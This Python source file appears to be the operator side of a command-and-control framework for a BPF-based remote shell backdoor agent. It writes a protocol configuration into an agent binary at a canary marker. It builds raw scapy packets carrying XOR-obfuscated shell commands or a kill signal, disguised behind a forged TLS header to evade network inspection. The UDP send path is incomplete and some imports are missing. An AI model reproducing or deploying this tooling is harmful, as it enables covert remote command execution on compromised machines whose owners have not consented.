from c2.view import C2View
from pathlib import Path
from importlib.resources import files
from scapy.all import IP, TCP, send
import struct
import argparse
import logging


class C2:
    KILL = 0x01
    SHELL = 0x02
    TCP = 0xFF
    UDP = 0xFE
    CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"

    def __init__(self, args: argparse.Namespace, log_level: int = logging.INFO):
        self.args = args
        self.view = C2View(log_level=log_level, logfile=args.log_file)

    def _get_packed_config(self, args: argparse.Namespace) -> bytes:
        """Generates packed data for the BPF Remote Shell Executable Agent configuration.

        Args:
            args (argparse.Namespace): argparse arguments containing packed data options.

        Returns:
            bytes: Packed data to be stamped
        """

        if args.protocol == "tcp":

            protocol = self.TCP
            port = 0
            seq = args.seq
        elif args.protocol == "udp":
            protocol = self.UDP
            port = args.dport
            seq = 0
        else:
            raise ValueError(f"Unknown protocol: {args.protocol}")

        config_format = "!BHI"
        empty_byte_len = len(self.CANARY) - struct.calcsize(config_format)

        packed_data = struct.pack(
            f"{config_format}{empty_byte_len}x", protocol, port, seq
        )
        return packed_data

    def _generate_payload(self, args: argparse.Namespace, is_kill: bool) -> bytes:
        """Generates the payload for the BPF Remote Shell Executable Agent.

        Args:
            args (argparse.Namespace): argparse arguments containing payload options.
            is_kill (bool): Flag indicating if the payload is for a kill command.

        Returns:
            bytes: Payload to be sent in the Raw packet
        """
        if is_kill:
            flag = self.KILL
            command = b""
        else:
            flag = self.SHELL
            command = args.command.encode(encoding="utf-8")

        footer = struct.pack("!BI", flag, len(command))

        payload = command + footer

        payload = bytes([b ^ 0x4F for b in payload])
        return payload

    def tcp_raw_send(self, args: argparse.Namespace) -> bool:
        """Sends a raw TCP packet to the configured agent.

        Args:
            args (argparse.Namespace): argparse arguments containing the TCP packet options.
        """

        try:
            payload = self._generate_payload(args, False)
        except UnicodeEncodeError:
            self.view.print_error("Could not encode shell command.")
            return False

        return self._send_fake_tls(payload, args)

    def udp_raw_send(self, args: argparse.Namespace) -> bool:
        """Sends a raw UDP packet to the configured agent.

        Args:
            args (argparse.Namespace): argparse arguments containing the UDP packet options.
        """

        try:
            payload = self._generate_payload(args, False)
        except UnicodeEncodeError:
            self.view.print_error("Could not encode shell command.")
            return False

    def _send_udp(self, payload: bytes, args: argparse.Namespace) -> bool:
        packet = (
            IP(dst=args.dip, src=args.sip)
            / UDP(dport=args.dport, sport=args.sport)
            / Raw(load=payload)
        )

        packet_len = len(packet)

        if packet_len > 5000:
            self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
            return False
        self.view.print_msg(f"Sending: {packet.summary()}")
        self.view.print_debug(f"Sending: {packet_len} bytes")
        try:
            send(packet, verbose=False)
            self.view.print_success("Packet sent successfully.")
        except PermissionError:
            self.view.print_error(f"Failed to send packet. Are you root?")
            return False
        return True

    def kill_agent(self, args: argparse.Namespace) -> bool:
        payload = self._generate_payload(args, True)

        return self._send_fake_tls(payload, args)

    def _send_fake_tls(self, payload: bytes, args: argparse.Namespace) -> bool:
        payload_len = struct.pack("!H", len(payload))

        tls_header = bytes.fromhex(
            "16030300800200007c0303dd875280dfd6e98188d937fbf419b0320d9a84af35b14219aa2ac9997"
            + "f02f9c420daab940bafefb1e25dc171e4f85b02a1f7b80b661bfdd7270021c89fe7988040130100"
            + "003400290002000000330024001d0020999098ac6cf3979e8ab1fa0ccebd6655f6513527f88f7c9"
            + "ae0ad16188e088a3f002b00020304140303000101170303"
        )
        tls_header += payload_len
        packet = (
            IP(dst=args.dip, src=args.sip)
            / TCP(dport=args.dport, sport=args.sport, flags="PA", seq=args.seq, ack=1)
            / tls_header
            / payload
        )

        packet_len = len(packet)

        if packet_len > 5000:
            self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
            return False
        self.view.print_msg(f"Sending: {packet.summary()}")
        self.view.print_debug(f"Sending: {packet_len} bytes")
        try:
            send(packet, verbose=False)
            self.view.print_success("Packet sent successfully.")
        except PermissionError:
            self.view.print_error(f"Failed to send packet. Are you root?")
            return False
        return True

    def configure(self, args: argparse.Namespace) -> bool:
        """Configure the BPF Remote Shell Executable Agent.

        Args:
            args (argparse.Namespace): argparse arguments containing the configuration options.
        """
        self.view.print_msg(f"Configuring with args: {args}")
        path = files("c2.deploy").joinpath("agent_x86_64")

        path = Path(path).resolve()

        if not path.exists():
            self.view.print_error("Agent executable not found.")
            return False

        with open(path, "rb") as f:
            data = f.read()
        agent_data = bytearray(data)

        index = agent_data.find(self.CANARY)

        if index == -1:
            self.view.print_error(f"Could not find agent canary.")
            return False

        packed_data = self._get_packed_config(args)
        new_data = agent_data
        new_data[index : index + len(packed_data)] = packed_data

        output_dir = Path(args.output)
        output_dir.mkdir(parents=True, exist_ok=True)

        output_dir = Path(output_dir, f"{args.name}.agent")

        with open(output_dir, "wb") as f:
            f.write(new_data)
        self.view.print_success(f"Written new config to {output_dir.absolute()}")

        return True
